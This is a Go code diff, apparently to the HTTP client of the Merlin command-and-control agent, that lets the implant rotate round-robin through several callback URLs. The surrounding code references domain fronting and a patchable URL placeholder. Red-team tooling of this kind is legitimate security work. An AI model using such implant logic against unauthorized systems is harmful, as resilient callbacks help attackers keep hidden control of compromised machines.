@@ -53,7 +53,7 @@ type Client struct {
 	clients.MerlinClient
 	Client     *http.Client // Client to send messages with
 	Protocol   string
-	URL        string            // URL to send messages to (e.g., https://127.0.0.1:443/test.php)
+	URL        []string          // URLs to send messages to (e.g., https://127.0.0.1:443/test.php)
 	Host       string            // HTTP Host header value
 	Proxy      string            // Proxy string
 	JWT        string            // JSON Web Token for authorization
@@ -65,6 +65,7 @@ type Client struct {
 	psk        string            // PSK is the Pre-Shared Key secret the agent will use to start authentication
 	AgentID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
 	opaque     *opaque.User      // TODO Turn this into a generic authentication package interface
+	CurrentURL int               // Variable to keep track of which of potentially multiple URLs to callback to next
 }
 
 // Config is a structure that is used to pass in all necessary information to instantiate a new Client
@@ -72,7 +73,7 @@ type Config struct {
 	AgentID     uuid.UUID // The Agent's UUID
 	Protocol    string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
 	Host        string    // Host is used with the HTTP Host header for Domain Fronting activities
-	URL         string    // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
+	URL         []string  // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
 	Proxy       string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
 	UserAgent   string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
 	PSK         string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
@@ -110,14 +111,15 @@ func New(config Config) (*Client, error) {
 		client.PaddingMax = IntPaddingMax
 	}
 	// Parse URL
-	if config.URL != "" {
+	if len(config.URL) != 0 {
 		client.URL = config.URL
 	} else {
 		//200 character max
 		StrURLPre := "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY"
 		StrURLPost := strings.Trim(StrURLPre, " ")
-		client.URL = StrURLPost
+		client.URL = strings.Split(StrURLPost, ",")
 	}
+	client.CurrentURL = 0
 	// Parse User Agent
 	if config.UserAgent != "" {
 		client.UserAgent = config.UserAgent
@@ -349,7 +351,7 @@ func (client *Client) getJWT() (string, error) {
 // This is where the client's logic is for communicating with the server.
 func (client *Client) SendMerlinMessage(m messages.Base) (messages.Base, error) {
 	cli.Message(cli.DEBUG, "Entering into agent.sendMessage()")
-	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s", messages.String(m.Type), client.URL))
+	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s", messages.String(m.Type), client.URL[client.CurrentURL]))
 
 	// Set the message padding
 	m.Padding = core.RandStringBytesMaskImprSrc(client.PaddingMax)
@@ -376,7 +378,13 @@ func (client *Client) SendMerlinMessage(m messages.Base) (messages.Base, error) 
 		return returnMessage, fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", messages.String(m.Type), errJWEBuffer.Error())
 	}
 
-	req, reqErr := http.NewRequest("POST", client.URL, jweBytes)
+	req, reqErr := http.NewRequest("POST", client.URL[client.CurrentURL], jweBytes)
+	if client.CurrentURL < (len(client.URL) - 1) {
+		client.CurrentURL = client.CurrentURL + 1
+	} else {
+		client.CurrentURL = 0
+	}
+
 	if reqErr != nil {
 		return returnMessage, fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
 	}
